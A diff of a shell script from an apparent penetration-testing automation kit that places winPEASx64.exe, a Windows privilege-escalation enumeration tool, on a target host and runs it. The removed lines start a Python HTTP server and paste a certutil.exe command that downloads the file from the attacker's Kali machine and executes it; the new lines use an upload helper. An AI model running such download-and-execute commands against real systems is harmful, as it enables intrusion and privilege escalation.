@@ -4,23 +4,13 @@
 download winPEASx64.exe to server and execute
 '
 
-# wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O ~/Desktop/base/code/xdotool/scripts/reconnaissance/linux/.files/winPEASx64.exe
+# wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O ${SCRIPTS_DIR}/reconnaissance/linux/.files/winPEASx64.exe
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
+LOCATION="${SCRIPTS_DIR}/reconnaissance/windows/cmd/.files"
+FILE="winPEASx64.exe"
 
-# Generate gui form
-generate_form "PORT"
+cmd_upload_file "${LOCATION}" "${FILE}"
+sleep 3
 
-PORT=${form_data["PORT"]}
-
-cd ~/Desktop/base/code/xdotool/scripts/reconnaissance/windows/cmd/.files
-python3 -m http.server ${PORT} &
-HTTP_PID=$!
-
-paste_command "certutil.exe -urlcache -split -f http://${KALI_IP}:${PORT}/winPEASx64.exe winPEASx64.exe && .\winPEASx64.exe"
+paste_command "${FILE_LOCATION}"
 xdotool key Return
-sleep 10
-
-kill $HTTP_PID
